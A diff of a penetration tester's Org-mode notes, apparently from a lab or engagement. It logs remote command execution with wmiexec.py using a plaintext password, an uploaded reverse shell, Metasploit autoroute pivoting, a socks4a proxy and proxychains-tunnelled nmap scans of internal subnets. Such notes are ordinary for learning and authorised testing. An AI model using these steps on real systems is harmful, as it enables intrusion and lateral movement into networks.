@@ -981,10 +981,11 @@ Next step - set up SOCKS proxy and proxychains
 **** NOTE! ssh server could be 7722 - doesn't show up in scan of the lower 1024 ports
 
 *** 18:05 reestablishing conection to .17
-with ~../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~
-re-adding routes to .3 and .5 subnet:
-run autoroute -s 10.59.3.0 -n 255.0.0.0
-run autoroute -s 10.59.5.0 -n 255.0.0.0
++ with ~../wmiexec.py bob:Very_SafeDAPW\!@10.59.4.17~
++ uploaded a new reverse shell - reverse-100-443
++ re-adding routes to .3 and .5 subnet:
+  * run autoroute -s 10.59.3.0 -n 255.0.0.0
+  * run autoroute -s 10.59.5.0 -n 255.0.0.0
 
 #+BEGIN_EXAMPLE
 msf5 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
@@ -1004,13 +1005,19 @@ https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
 + Load the socks4a module
   #+BEGIN_SRC
   use auxiliary/server/socks4a
+  set SRVHOST 
   set SRVPORT 8080
   run
   #+END_SRC
 
 + Now let's configure proxychains to the port we defined
   * edit ~/etc/proxychains.conf~ - changed last line to:
-  * ~socks4 	10.59.4.12 8080~
+  * ~socks4 	127.0.0.1 8080~
 + now we should be able to run external tools through the tunnel:
   * ~proxychains nmap -sV 10.59.3.14~
-+ 
++ Alternative way to set up route:
+  * use multi/manage/autoroute
+  * set SESSION 1
+  * set SUBNET 10.59.3.0
+  * run
+  * NOTE: needed to change the command from ~add auto~ to ~add~
